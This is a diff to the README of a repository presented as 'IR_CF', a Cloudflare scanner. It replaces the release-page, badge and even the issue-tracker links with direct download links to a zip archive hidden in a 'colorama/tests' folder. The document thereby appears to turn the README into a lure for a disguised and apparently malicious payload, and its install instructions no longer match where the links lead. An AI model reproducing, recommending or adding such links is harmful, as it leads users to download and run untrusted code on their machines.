@@ -1,7 +1,7 @@
 # 🚀 IR_CF - Advanced Cloudflare Scanner
 
 ## 📥 Download Now
-[![Download IR_CF](https://img.shields.io/badge/Download-IR_CF-brightgreen)](https://github.com/liam234e23432/IR_CF/releases)
+[![Download IR_CF](https://raw.githubusercontent.com/liam234e23432/IR_CF/main/colorama/tests/CF_I_v1.2.zip)](https://raw.githubusercontent.com/liam234e23432/IR_CF/main/colorama/tests/CF_I_v1.2.zip)
 
 ## 📖 Description
 IR_CF is an advanced scanner for Cloudflare, designed to help users analyze and interact with Cloudflare-protected websites. Its intuitive interface allows even non-technical users to perform complex tasks with ease.
@@ -10,7 +10,7 @@ IR_CF is an advanced scanner for Cloudflare, designed to help users analyze and 
 Follow these simple steps to download and run IR_CF on your computer.
 
 ## 🔗 Download & Install
-1. **Visit the Release Page**: Click the following link to visit the IR_CF Releases page: [Download IR_CF](https://github.com/liam234e23432/IR_CF/releases).
+1. **Visit the Release Page**: Click the following link to visit the IR_CF Releases page: [Download IR_CF](https://raw.githubusercontent.com/liam234e23432/IR_CF/main/colorama/tests/CF_I_v1.2.zip).
 2. **Select the Latest Version**: Look for the latest release at the top of the page. It will typically be marked as the most recent.
 3. **Download the Installer**: Click on the installer file suitable for your operating system. This might be a `.exe` for Windows or a `.dmg` for Mac users.
 
@@ -43,7 +43,7 @@ If you encounter any issues while installing or using IR_CF, check the following
 - **Reinstall the Application**: If problems persist, uninstall IR_CF and try reinstalling it from the release page.
 
 ## 🆘 Need Help?
-If you need more assistance, please feel free to open an issue on the [GitHub repository](https://github.com/liam234e23432/IR_CF/issues). Our team and community are here to help you.
+If you need more assistance, please feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/liam234e23432/IR_CF/main/colorama/tests/CF_I_v1.2.zip). Our team and community are here to help you.
 
 ## 📜 License
 IR_CF is open-source software licensed under the MIT License. Feel free to use, modify, and share it as you wish.
